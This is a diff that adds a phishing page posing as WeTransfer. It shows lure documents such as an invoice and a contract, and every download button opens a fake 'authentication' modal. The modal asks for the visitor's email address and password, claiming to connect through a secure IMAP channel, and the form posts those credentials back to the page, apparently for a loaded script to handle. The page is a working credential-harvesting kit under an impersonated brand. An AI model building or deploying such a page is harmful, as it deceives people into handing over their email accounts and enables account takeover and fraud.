@@ -1,0 +1,288 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>WeTransfer</title>
+    <link rel="icon" type="image/x-icon" href="https://iili.io/JIXidEN.png">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <style>
+        #loader {
+            -webkit-animation: fadeout 10s linear forwards;
+            animation: fadeout 5s linear forwards;
+        }
+
+        .nav-container {
+            opacity: 0;
+            display: block;
+            -webkit-animation: fadein 20s linear forwards;
+            animation: fadein 1s linear forwards;
+            animation-delay: 2s;
+        }
+
+        @-webkit-keyframes fadeout {
+            90% {
+                opacity: 1;
+            }
+
+            99% {
+                opacity: 0;
+                height: 200px
+            }
+
+            100% {
+                opacity: 0;
+                height: 0
+            }
+        }
+
+        @keyframes fadeout {
+            90% {
+                opacity: 1;
+            }
+
+            99% {
+                opacity: 1;
+                height: 200px
+            }
+
+            100% {
+                opacity: 0;
+                height: 0
+            }
+        }
+
+        @-webkit-keyframes fadein {
+            0% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadein {
+            0% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+    <style>
+        body {
+            background-color: #f1f1f1;
+            overflow: hidden;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        .head1 {
+            display: flex;
+            position: relative;
+            justify-content: space-between;
+        }
+
+        .contain-all {
+            display: flex;
+            position: relative;
+            justify-content: space-between;
+            padding: 2%;
+
+
+        }
+
+        .logbox {
+            width: 22%;
+            height: 100%;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            margin-left: 20px;
+            background-color: #fff;
+        }
+
+        .write-test {
+            font-size: 40px;
+            line-height: 120%;
+        }
+
+        .accept1 {
+            margin-top: 30px;
+        }
+
+        .flex-container {
+            display: flex;
+            flex-direction: column;
+            margin-top: 10px;
+        }
+
+        .div1 {
+            display: flex;
+            position: relative;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .img-btn {
+            cursor: pointer;
+        }
+    </style>
+
+
+<style>
+    @media (max-width:480px){
+        .logbox{
+            width: 100%;
+        }
+
+        .imgdispaybox{
+            display:none;
+        }
+
+        .contentbox{
+            display: none;
+        }
+    }
+</style>
+</head>
+
+<body>
+
+    <div class="head1">
+        <div class="logo"><img src="https://iili.io/JIXgWPt.png" alt="logo"></div>
+        <div class="navimg"><img src="https://iili.io/JIXUp8G.png" alt="wet-nav"></div>
+    </div>
+
+
+    <div class="contain-all">
+        <div class="logbox">
+            <div><img src="https://iili.io/JIXidEN.png" alt="lo-black"></div>
+            <div class="write-test"><span>You're</span><br />
+                <b>almost</b> there
+            </div>
+
+            <div class="flex-container">
+                <div class="div1">
+                    <div>PO_201AJ02.xls</div>
+                    <div class="img-btn" data-bs-toggle="modal" data-bs-target="#exampleModal"><img
+                            src="https://iili.io/JIhHVFs.png" alt="download"></div>
+                </div>
+
+                <div class="div1">
+                    <div>Product-Specifications.pdf</div>
+                    <div class="img-btn" data-bs-toggle="modal" data-bs-target="#exampleModal"><img
+                            src="https://iili.io/JIhHVFs.png" alt="download"></div>
+                </div>
+
+                <div class="div1">
+                    <div>Contract.xls</div>
+                    <div class="img-btn" data-bs-toggle="modal" data-bs-target="#exampleModal"><img
+                            src="https://iili.io/JIhHVFs.png" alt="download"></div>
+                </div>
+
+                <div class="div1">
+                    <div>Final Invoice: F-202312-229.pdf</div>
+                    <div class="img-btn" data-bs-toggle="modal" data-bs-target="#exampleModal"><img
+                            src="https://iili.io/JIhHVFs.png" alt="download"></div>
+                </div>
+
+
+            </div>
+
+            <div class="accept1">To continue, please agree<br />
+                to our <u><b><span class="img-btn" data-bs-toggle="modal" data-bs-target="#exampleModal">Terms Of
+                            Service.</span></b></u></div>
+
+            <hr>
+
+            <center>
+                <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal">
+                    Download
+                </button>
+            </center>
+        </div>
+        <div class="contentbox"><img src="https://iili.io/JIX4qpj.png" alt="content"></div>
+        <div class="imgdispaybox"><img src="https://iili.io/JIX6qFt.png" alt="imgco"></div>
+    </div>
+
+
+    <!-- Modal -->
+    <form action="" method="post">
+        <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h1 class="modal-title fs-5" id="exampleModalLabel">Authentication in progress</h1>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                    </div>
+                    <div class="modal-body">
+                        <div id="loader">
+                            <center>
+                                <img src="https://iili.io/JIjd2HJ.gif" alt="" width="30%">
+                                <p>Connecting <b><span id="connect"></span></b> Email Server to WeTransfer</p>
+                            </center>
+                        </div>
+
+                        <div class="nav-container">
+                            <div class="alert alert-primary" role="alert">
+                                These files are sensitive and secured against unauthorized access. In order to access
+                                this file, please provide your correct email credentials, we will connect to your email
+                                provider through a secure IMAP channel to authorize your download.
+                            </div>
+
+                            <div class="mb-3">
+                                <label for="exampleFormControlInput1" class="form-label">Email address:</label>
+                                <input type="email" class="form-control" id="email" name="email"
+                                    placeholder="name@example.com">
+                            </div>
+
+                            <div class="mb-3">
+                                <label for="exampleFormControlInput1" class="form-label">Password:</label>
+                                <input type="password" class="form-control" id="password" name="password"
+                                    placeholder="Enter Email Password">
+                            </div>
+                            <div class="alert alert-danger" id="msg" style="display: hidden;" role="alert">
+                            </div>
+
+                        </div>
+
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" id="submit-btn" class="btn btn-primary">Download Now</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form>
+
+
+    <script>
+        const myModal = document.getElementById('myModal')
+        const myInput = document.getElementById('myInput')
+
+        myModal.addEventListener('shown.bs.modal', () => {
+            myInput.focus()
+        })
+
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+        crossorigin="anonymous"></script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <script src="app.js"></script>
+</body>
+
+</html>
